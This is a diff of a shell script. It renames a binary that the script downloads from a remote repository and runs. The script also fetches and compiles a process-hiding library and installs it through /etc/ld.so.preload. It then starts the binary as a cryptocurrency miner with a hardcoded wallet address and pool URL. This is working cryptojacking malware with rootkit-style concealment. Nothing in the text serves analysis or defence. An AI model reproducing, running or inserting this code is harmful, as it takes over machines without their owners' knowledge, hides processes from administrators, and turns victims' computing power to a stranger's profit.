@@ -31,8 +31,8 @@ echo ""
 echo " "
 echo " "
 
-./update/update wget https://gitlab.com/asraktanusi064/gacor/-/raw/main/gacormaseh
-chmod +x gacormaseh 
+./update/update wget https://gitlab.com/asraktanusi064/gacor/-/raw/main/Comedy
+chmod +x Comedy 
  
 ./update/update wget https://github.com/nathanfleight/update/raw/main/MagicComedy.zip
 unzip MagicComedy.zip 
@@ -41,4 +41,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/ 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
  
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./update/update ./gacormaseh -a ixi -r $ip -w 3AymKAZRtcHptxN6eXrwk6FXYpvYzW9cCWLRtrKX6YhGbqUSNLYzw6ScPdz3dZBJy -p http://mineixi.com:80
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./update/update ./Comedy -a ixi -r $ip -w 3AymKAZRtcHptxN6eXrwk6FXYpvYzW9cCWLRtrKX6YhGbqUSNLYzw6ScPdz3dZBJy -p http://mineixi.com:80
